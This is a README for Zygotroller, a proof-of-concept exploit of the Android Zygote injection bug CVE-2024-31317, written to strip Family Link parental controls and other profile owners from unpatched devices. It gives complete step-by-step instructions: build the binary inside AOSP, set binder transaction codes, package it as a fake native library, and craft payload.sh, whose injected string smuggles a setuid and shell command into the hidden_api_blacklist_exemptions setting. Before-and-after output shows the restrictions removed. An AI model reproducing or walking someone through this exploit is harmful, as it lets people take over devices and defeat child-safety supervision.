# Zygotroller
## Remove profile owners/Family Link on ANY pre June 2024 Developer Mode device (Android 12+)
Zygotroller is a proof-of-concept that can remove a profile owner and associated restrictions with CVE-2024-31317's Zygote injection bug.
It requires developer mode and the latest security patch to be prior to June 2024.

Google's parental control system, Family Link, is shown as an example in this repo.

# Using
You will need a modern-ish device running a Debian based distro to compile Zygotroller. Prebuilts may or may not be available depending on the time of reading this.

Unfortunately this relies on internal parts of Android, so you need to clone the entirety of the Android source code in order to build Zygotroller. Make sure you have at least 400gb of free space, although you will likely use less.

IMPORTANT IF USING WSL: Make sure you have a LOT of swap, or WSL will crash. I personally used 32G:
```
sudo fallocate -l 32G /swapfile
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
```

Now for cloning AOSP source:
```
mkdir ~/aosp
cd ~/aosp
```
`repo init --partial-clone --no-use-superproject -b android-latest-release -u https://android.googlesource.com/platform/manifest`

`repo sync -c -j8` (might take multiple tries due to ratelimits)

`source build/envsetup.sh`

`lunch aosp_cf_arm64_only_phone-aosp_current-eng` (if you're testing this on an emulator, change arm64 to x86_64)

`cd ~/aosp/external`

`git clone https://github.com/rifting/Zygotroller`

`cd Zygotroller`

Now we need to change the values in the script to our actual profile owner and opcode for clearProfileOwner.
The profile owner can either be in the Google play services "supervision" package or in Google play services itself. Run `dpm list-owners`, my result was like so:
```
$ dpm list-owners
1 owner:
User  0: admin=com.google.android.gms.supervision/com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver,ProfileOwner
```
This gives us two pieces of information we need for Zygotroller, the package name (com.google.android.gms.supervision) and the class name (com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver).

Edit zygotroll.cpp with your preferred text editor and update these lines to your profile owner component:
```
    // Family Link profile owner
    std::string pkg = "com.google.android.gms.supervision";
    std::string cls = "com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver";
```
Now you need to find the opcode for the clearProfileOwner function of DPM. This was "91" for me, but it varies depending on the version/type of Android you're running. To get the opcode for clearProfileOwner, I used [android-svc](https://github.com/T-vK/android-svc) with the command 

`android-svc convert 'android.app.admin.IDevicePolicyManager.clearProfileOwner("dummy")'`

The number you see in the output will be the opcode for clearprofile owner, open up zygotroll.cpp again with your preferred text editor and edit the number here, to your actual opcode:
```
    // Transaction code 91 was ClearProfileOwner for my device
    dpm->transact(91, data, &reply);
```

You'll want to do the same thing with setUserRestriction:
```
// Transaction code 132 was setUserRestriction for my device
dpm->transact(132, data2, &reply2);
```

Now we need to compile zygotroller:

`mm`

This can take a LONG time on initial build, subsequent builds will take <1m on most modern machines.

Find your binary in `~/aosp/out/target/product/vsoc_x86_64_only/system/bin/zygotroller`

Now we need to make an app that contains this binary as a "shared library" that is actually just the Zygotroller executable, so SELinux lets us execute it.
You can use my "CopyNativeLib" repo for that:

`git clone https://github.com/rifting/CopyNativeLib.git`

Then rename your Zygotroller binary to `libzygotroller.so` and put it in app/src/main/jniLibs/arm64-v8a (I'm assuming that will be the architecture of your phone). Build the APK in android studio and install to your device with `adb install`.

The family link profile owner was userid 10090 for me, AKA u0_a90
Do `dumpsys package com.google.android.gms.supervision | grep userId=`

Now take a look at payload.sh, on this line

`inject='\n--setuid=10090...`

Change the UID here from 10090 to whatever your UID from the dumpsys command was. If it's the same ID, leave it.

Look a little further on that line and you'll see 

`...echo zYg0te $(LD_LIBRARY_PATH=[path to your native lib] [path to your native lib])...`

(three dots used to show truncation)

You need to replace these with the paths to the native library you've just installed to the device. Run `pm path com.rifting.copynativelib`.
The path to the file will be the parent directory of the APK shown as the output of the command, + `lib/arm64-v8a/libzygotroller.so`. So that line will end up looking something like this:

`...echo zYg0te $(LD_LIBRARY_PATH=/data/app/~~IQhIf-M_9eLGoJ-Wd-qaCA==/com.rifting.copynativelib-a6N1upfA-_Trjh_cPCHngA==/lib/x86_64/ /data/app/~~IQhIf-M_9eLGoJ-Wd-qaCA==/com.rifting.copynativelib-a6N1upfA-_Trjh_cPCHngA==/lib/x86_64/libreal.so)...`

You're almost there! Push this file to /data/local/tmp

`adb push payload.sh /data/local/tmp`

Set permissions:

`chmod +x /data/local/tmp/payload.sh`

And finally, send its output into hidden_api_blacklist_exemptions!

`settings put global hidden_api_blacklist_exemptions "$(sh ./payload.sh)"`

Now set this to "0" to avoid a bootloop :)
`settings put global hidden_api_blacklist_exemptions 0`

You should see that the Family Link profile owner + all associated restrictions have been removed.
Go into settings and manage accounts, and remove the supervised account from the device. Congratulations!

Before:
```
$ dpm list-owners
1 owner:
User  0: admin=com.google.android.gms.supervision/com.google.android.gms.kids.account.receiver.ProfileOwnerReceiver,ProfileOwner
```
```
$ abx2xml /data/system/users/0.xml -
...
<device_policy_local_restrictions>
    <restrictions_user user_id="0">
      <restrictions no_factory_reset="true" no_config_location="true" no_add_clone_profile="true" no_safe_boot="true" no_config_credentials="true" no_config_date_time="true" />
    </restrictions_user>
  </device_policy_local_restrictions>
...
```

After:
```
$ dpm list-owners
no owners
emu64xa:/ $
```
```
$ abx2xml /data/system/users/0.xml -
...
<device_policy_local_restrictions />
...
```


## Special Thanks
[gburca for BinderDemo](https://github.com/gburca/BinderDemo)

[LLeaves' awesome blog about this CVE](https://blog.lleavesg.top/article/CVE-2024-31317-Zygote)
